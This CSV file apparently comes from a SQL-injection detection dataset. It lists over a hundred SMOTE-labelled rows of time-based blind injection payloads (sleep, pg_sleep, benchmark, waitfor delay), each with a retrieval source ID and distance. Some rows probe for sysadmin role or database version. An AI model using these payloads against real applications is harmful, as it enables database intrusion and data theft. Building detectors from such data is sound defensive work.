id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000183,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.09987092807573528
SMOTE_000184,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.6967036658752171
SMOTE_000185,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.5673690041654287
SMOTE_000186,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.9901403448969137
SMOTE_000187,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,0.9254579810275076
SMOTE_000188,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.07302197972808874
SMOTE_000189,attack,time,"1""   )    )    as vbpl where 3885  =  3885 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000056,0.9514433162329323
SMOTE_000190,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.6671875261562645
SMOTE_000191,attack,time,""";waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000025,1.1119387934826435
SMOTE_000192,attack,time,"""   )    )   ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000034,0.09656867013494314
SMOTE_000193,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,2.3370161014395396
SMOTE_000194,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,0.9955019109385471
SMOTE_000195,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,3.5518358998982547
SMOTE_000196,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.0031831263782427
SMOTE_000197,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.17147510372440922
SMOTE_000198,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,0.7206666619166754
SMOTE_000199,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,0.5512515143057424
SMOTE_000200,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,1.6200231722973955
SMOTE_000201,attack,time,"1'||  (  select 'kojx' from dual where 8140  =  8140 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000061,0.3937156910392833
SMOTE_000202,attack,time,"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.9595251373564038
SMOTE_000203,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.10039153757375804
SMOTE_000204,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",nearest_attack_euclidean,R000076,0.6857680726380465
SMOTE_000205,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.22860655553187098
SMOTE_000206,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.9206151727482054
SMOTE_000207,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.6508836775895206
SMOTE_000208,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,2.44537875054195
SMOTE_000209,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.717115690798289
SMOTE_000210,attack,time, )    )    or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000031,0.5161286602842331
SMOTE_000211,attack,time,a' waitfor delay '0:0:10'--,nearest_attack_euclidean,R000011,2.894449688149259
SMOTE_000212,attack,time,", if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000023,0.9634203088686764
SMOTE_000213,attack,time,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000077,3.4180659723307145
SMOTE_000214,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.313973712494583
SMOTE_000215,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,1.14404944588833
SMOTE_000216,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.24724148966102533
SMOTE_000217,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,1.5424949838975461
SMOTE_000218,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,1.4032067115431421
SMOTE_000219,attack,time,", if not  (  select system_user  )   <> 'sa' waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,0.1584109572034354
SMOTE_000220,attack,time,"1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000070,2.444976944638302
SMOTE_000221,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.9362270397522288
SMOTE_000222,attack,time,1   )    )    or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000033,0.21398934754003043
SMOTE_000223,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.7314504861158405
SMOTE_000224,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.053445950908845165
SMOTE_000225,attack,time,"   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000038,0.09169001788006578
SMOTE_000226,attack,time,"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000066,0.8122221882792264
SMOTE_000227,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,1.5277579326214772
SMOTE_000228,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.45034128449275407
SMOTE_000229,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,2.777395423694128
SMOTE_000230,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,0.26905767563829946
SMOTE_000231,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,1.5915759420921087
SMOTE_000232,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""baia""  =  ""baia",nearest_attack_euclidean,R000046,1.0597240991800172
SMOTE_000233,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.1765463721617437
SMOTE_000234,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,1.2683728050370449
SMOTE_000235,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.4842368758305073
SMOTE_000236,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.43760256814754966
SMOTE_000237,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,2.1326828253838555
SMOTE_000238,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.7164424615511537
SMOTE_000239,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,1.1204490514158127
SMOTE_000240,attack,time,"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000051,2.9699287754511254
SMOTE_000241,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000043,4.804839627880367
SMOTE_000242,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,0.31739644349835217
SMOTE_000243,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,0.22239102217701212
SMOTE_000244,attack,time,1'  )   where 7629  =  7629 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000058,0.007867784486975045
SMOTE_000245,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.14511023094988237
SMOTE_000246,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.2724908695537599
SMOTE_000247,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.1999434325876264
SMOTE_000248,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,2.4637218358429243
SMOTE_000249,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.8055046765683627
SMOTE_000250,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.6466235267922595
SMOTE_000251,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.48059815590869576
SMOTE_000252,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000073,3.6467573077588544
SMOTE_000253,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 8  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000037,0.022160053835458344
SMOTE_000254,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.4278038409374811
SMOTE_000255,attack,time,"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000050,0.20102434490049761
SMOTE_000256,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,1.0268935218148436
SMOTE_000257,attack,time,1   )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000006,0.20505281316927845
SMOTE_000258,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.39070110996745033
SMOTE_000259,attack,time,select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,nearest_attack_euclidean,R000057,0.5126301634712608
SMOTE_000260,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.5234412155224958
SMOTE_000261,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,2.9831502987546696
SMOTE_000262,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,0.015974211977948582
SMOTE_000263,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,1.267833078850577
SMOTE_000264,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.9376753565682658
SMOTE_000265,attack,time,"""  )   or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000017,0.9791152144836232
SMOTE_000266,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.037925903399003855
SMOTE_000267,attack,time,"""  )  ;waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000009,0.018052059094667276
SMOTE_000268,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,3.605134196595327
SMOTE_000269,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.12016856499429306
SMOTE_000270,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,2.3302692249185815
SMOTE_000271,attack,time,"1"" where 7739  =  7739 and sleep  (  5  )  --",nearest_attack_euclidean,R000069,1.388905454825478
SMOTE_000272,attack,time,1   )    )    or sleep  (  5  )  #,nearest_attack_euclidean,R000048,0.68457592810212
SMOTE_000273,attack,time,"""   )    )    or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000026,1.1512019404441667
SMOTE_000274,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000049,1.5505260227383837
SMOTE_000275,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.26637274145391326
SMOTE_000276,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,0.10337056832031652
SMOTE_000277,attack,time,"1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000036,1.522678659151301
SMOTE_000278,attack,time,"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",nearest_attack_euclidean,R000043,0.5461922739166701
SMOTE_000279,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.92644583581541
SMOTE_000280,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,0.044229375654530355
SMOTE_000281,attack,time,1'  )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R000068,0.7332436769782927
SMOTE_000282,attack,time,"1"" or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000065,1.2075345223537755
SMOTE_000283,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,1.280162294819512
SMOTE_000284,attack,time," )  ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000027,1.755568758082348
SMOTE_000285,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,1.3633813461591127
SMOTE_000286,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,2.9413759002940107
SMOTE_000287,attack,time,"1   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000047,2.141829024818052
SMOTE_000288,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,0.31550311664805614
SMOTE_000289,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,2.3529854459867052
SMOTE_000290,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.3893590700259664
SMOTE_000291,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,1.6651463278179661
SMOTE_000292,attack,time,""" or sleep  (  __TIME__  )  #",nearest_attack_euclidean,R000030,0.3437630193850807
SMOTE_000293,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.11372120914201113
SMOTE_000294,attack,time,pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000015,0.7520142194357969
SMOTE_000295,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000042,0.5040283553471809
SMOTE_000296,attack,time,"1""   )    )    as dnhd where 2657  =  2657 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000044,1.911299007119986
SMOTE_000297,attack,time,"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000063,1.069318131365111
SMOTE_000298,attack,time,1 waitfor delay '0:0:10'--,nearest_attack_euclidean,R000021,0.5210373153038776
SMOTE_000299,attack,time,""" or pg_sleep  (  __TIME__  )  --",nearest_attack_euclidean,R000001,1.2748224158447623
SMOTE_000300,attack,time,1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000053,2.676440844460273
SMOTE_000301,attack,time,"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000064,0.8654470189080958
SMOTE_000302,attack,time,"1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000045,0.06194380202889469
SMOTE_000303,attack,time,"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000035,0.3041695549713284
SMOTE_000304,attack,time,1  )   or sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000008,1.1245545382102375
